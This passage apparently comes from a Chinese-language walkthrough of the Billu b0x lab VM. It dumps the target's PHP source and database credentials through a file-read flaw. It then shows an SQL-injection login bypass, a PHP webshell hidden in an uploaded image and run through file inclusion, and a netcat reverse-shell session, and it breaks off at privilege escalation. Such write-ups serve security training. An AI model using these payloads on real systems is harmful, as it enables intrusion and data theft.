class="hljs-string">Show me your SQLI skills &lt;br&gt;</span><br><span class="hljs-string">&lt;form method=post&gt;</span><br><span class="hljs-string">Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="hljs-string">&lt;input type=submit name=login value=&quot;let\&#x27;s login&quot;&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));<br>        <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));<br>        <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are allowed&lt;br&gt;&quot;</span>;<br>           <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-literal">true</span>;<br>           <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]=<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>           <br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>   <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=5 face=\&quot;comic sans ms\&quot; style=\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>c.php，有个密码，尝试 ssh 登录，但是失败</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./c.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>&lt;?php<br><span class="hljs-comment">#header( &#x27;Z-Powered-By:its chutiyapa xD&#x27; );</span><br>header(<span class="hljs-string">&#x27;X-Frame-Options: SAMEORIGIN&#x27;</span>);<br>header( <span class="hljs-string">&#x27;Server:testing only&#x27;</span> );<br>header( <span class="hljs-string">&#x27;X-Powered-By:testing only&#x27;</span> );<br><br>ini_set( <span class="hljs-string">&#x27;session.cookie_httponly&#x27;</span>, <span class="hljs-number">1</span> );<br><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;billu&quot;</span>,<span class="hljs-string">&quot;b0x_billu&quot;</span>,<span class="hljs-string">&quot;ica_lab&quot;</span>);<br><br>// Check connection<br><span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>  &#123;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;connection failed -&gt;  &quot;</span> . mysqli_connect_error();<br>  &#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>panel.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./panel.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br>session_start();<br><br>include(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br>include(<span class="hljs-string">&#x27;head2.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-selector-tag">@</span><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]!=true )<br>&#123;<br>                header(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>, true, <span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br><br>&#125;<br><br><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to billu b0x &quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;lg&#x27;</span>]))<br>&#123;<br>        unset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]);<br>        unset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>        header(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>, true, <span class="hljs-number">302</span>);<br>&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;form method=post&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;select name=load&gt;</span><br><span class="hljs-string">    &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt;</span><br><span class="hljs-string">        &lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;</span><br><span class="hljs-string">&lt;/select&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string"> &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$dir</span>=getcwd();<br>        <span class="hljs-variable">$choice</span>=str_replace(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>        &#123;<br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>                        die();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>        &#123;<br>        <br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>                die();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>        &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;upload&#x27;</span>]))<br>&#123;<br><br>        <span class="hljs-variable">$name</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$address</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;address&#x27;</span>]);<br>        <span class="hljs-variable">$id</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br>        <span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>        &#123;<br>                <span class="hljs-variable">$iname</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$r</span>=pathinfo(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);<br>        <span class="hljs-variable">$image</span>=array(<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$image</span>))<br>        &#123;<br>                <span class="hljs-variable">$finfo</span> = @new finfo(FILEINFO_MIME); <br>        <span class="hljs-variable">$filetype</span> = <span class="hljs-selector-tag">@</span><span class="hljs-variable">$finfo</span>-&gt;file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>                <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/image\/jpeg/&#x27;</span>,<span class="hljs-variable">$filetype</span> )  || preg_match(<span class="hljs-string">&#x27;/image\/png/&#x27;</span>,<span class="hljs-variable">$filetype</span> ) || preg_match(<span class="hljs-string">&#x27;/image\/gif/&#x27;</span>,<span class="hljs-variable">$filetype</span> ))<br>                                &#123;<br>                                        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;uploaded_images/&#x27;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>                                                         &#123;<br>                                                          <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Uploaded successfully &quot;</span>;<br>                                                          <span class="hljs-variable">$update</span>=<span class="hljs-string">&#x27;insert into users(name,address,image,id) values(\&#x27;</span><span class="hljs-string">&#x27;.$name.&#x27;</span>\<span class="hljs-string">&#x27;,\&#x27;</span><span class="hljs-string">&#x27;.$address.&#x27;</span>\<span class="hljs-string">&#x27;,\&#x27;</span><span class="hljs-string">&#x27;.$iname.&#x27;</span>\<span class="hljs-string">&#x27;, \&#x27;</span><span class="hljs-string">&#x27;.$id.&#x27;</span>\<span class="hljs-string">&#x27;)&#x27;</span>; <br>                                                         mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$update</span>);<br>                                                          <br>                                                        &#125;<br>                                &#125;<br>                        <span class="hljs-keyword">else</span><br>                        &#123;<br>                                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;<br>                        &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;<br><br>        &#125;<br>&#125;<br><br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./test.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_download</span><span class="hljs-params">(<span class="hljs-variable">$download</span>)</span></span><br>&#123;<br>        <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$download</span>))<br>                                &#123;<br>                                        header(<span class="hljs-string">&quot;Content-Description: File Transfer&quot;</span>); <br><br>                                        header(<span class="hljs-string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Pragma: public&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Accept-Ranges: bytes&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.basename(<span class="hljs-variable">$download</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>); <br>                                        header(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . filesize(<span class="hljs-variable">$download</span>));<br>                                        header(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>); <br>                                        ob_clean();<br>                                        flush();<br>                                        readfile (<span class="hljs-variable">$download</span>);<br>                                &#125;<br>                                <span class="hljs-keyword">else</span><br>                                &#123;<br>                                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;file not found&quot;</span>;<br>                                &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br>&#123;<br>file_download(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;\&#x27;</span>file\<span class="hljs-string">&#x27; parameter is empty. Please provide file path in \&#x27;</span>file\<span class="hljs-string">&#x27; parameter &#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>show.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./show.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br>include(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from users &#x27;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br><span class="hljs-keyword">if</span> (mysqli_num_rows(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;table width=90% &gt;&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;User&lt;/td&gt;&lt;td&gt;Address&lt;/td&gt;&lt;td&gt;Image&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br> <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_assoc(<span class="hljs-variable">$result</span>)) <br>   &#123;<br>           <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&lt;img src=&quot;uploaded_images/&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;image&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&quot; height=90px width=100px&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>&#125;<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br>&#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>通过代码审计发现:panel.php 文件是登陆后才能访问的，绕过的语法是 <code>&#39; or 1=1 -- \</code></p><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>实际上这里的第二个引号由于转义字符的存在导致其无法发挥作用，而是第一个引号和第三个引号才实现了闭合，因此第一个–+实际上没有发挥作用。</p><p><img src="/pic/0456f4a222c3bb5a4ffae8f968acb5f5_MD5.png"></p><p>实际上也可以使用 <code>\</code> 作为密码，并且由于 <code>&#39;</code> 在代码中被过滤，使用 <code>or 1=1 -- \</code> 作为username来绕过，也可以实现同样的效果，下图也是可以登录成功的</p><p><img src="/pic/9bc0ce88026986efb6cd1e25a9e0b86c_MD5.png"></p><p>登录成功发现了两个用户，有两个功能一是 show，二是 add，正好对应了之前目录扫描的结果，我们在这里尝试新增加一个用户，并且在图片中增加一句话木马的代码 <code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p><p><img src="/pic/cc7a59d812e08de19b439f805ed43067_MD5.png"></p><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>写入一句话木马的 jpg 图片</p><p><img src="/pic/c244e22fce7e9a4040eb88e5634f76c3_MD5.png"></p><p>直接访问图片并没有实现反弹 powershell，也就是说我们需要考虑另一种利用方式来访问此文件，这时候我们就需要使用 burpsuite 了，因为 panel 本身是需要加载 show.php 的，也就是说在 panel.php 是可以加载其他 php 文件的</p><p>burp 抓包中可以看到 load&#x3D;show 处应该是加载文件的路径，这时候我们替换为我们一句话木马的路径，并且在参数中给定 cmd&#x3D;whoami 进行尝试</p><p><img src="/pic/c43222af837821f839b45bb01145dc13_MD5.png"></p><p>成功运行了一句话木马</p><p>![[pic&#x2F;Pasted image 20230524173536.png]]</p><p>接下来我们将一句话木马转换为 reverse_powershell ，借助于网络上的 payload 我们很方便地确定 cmd 的值，并且这里刚开始反弹并不成功，在使用 URL 编码对关键词进行编码后实现了反弹 powershell</p><p><img src="/pic/10a98a23d0441df79c025565fafa5970_MD5.png"></p><p>反弹powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">443</span>                           <br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>listening on [<span class="hljs-type">any</span>] <span class="hljs-number">443</span> ...<br>connect to <span class="hljs-function">[<span class="hljs-number">10.10</span><span class="hljs-type">.10.160</span>] <span class="hljs-title">from</span></span> (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>] <span class="hljs-number">47297</span><br>/bin/sh: <span class="hljs-number">0</span>: cannot access tty; job control turned off<br><span class="hljs-variable">$</span> whoami<br>www<span class="hljs-literal">-data</span><br><span class="hljs-variable">$</span> python <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$whoami</span><br>whoami<br>www<span class="hljs-literal">-data</span><br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> ip a<br>ip a<br><span class="hljs-number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    inet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc pfifo_fast state UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:a9:a2:<span class="hljs-number">24</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.10</span>.<span class="hljs-number">10.255</span> scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fea9:a224/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> sudo <span class="hljs-literal">-l</span><br>sudo <span class="hljs-literal">-l</span><br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>sudo: <span class="hljs-number">3</span> incorrect password attempts<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> uname <span class="hljs-literal">-a</span><br>uname <span class="hljs-literal">-a</span><br>Linux indipowershell <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span><span class="hljs-literal">-32-generic</span> <span class="hljs-comment">#57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="密码重用-ssh-登录"><a href="#密码重用-ssh-登录" class="headerlink" title="密码重用 ssh 登录"></a>密码重用 ssh 登录</h3><p>查看一下当前目录，看到了 phpmy 目录进去看看，发现有 config 文件（这里叫做 config.inc.php），查看文件内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span 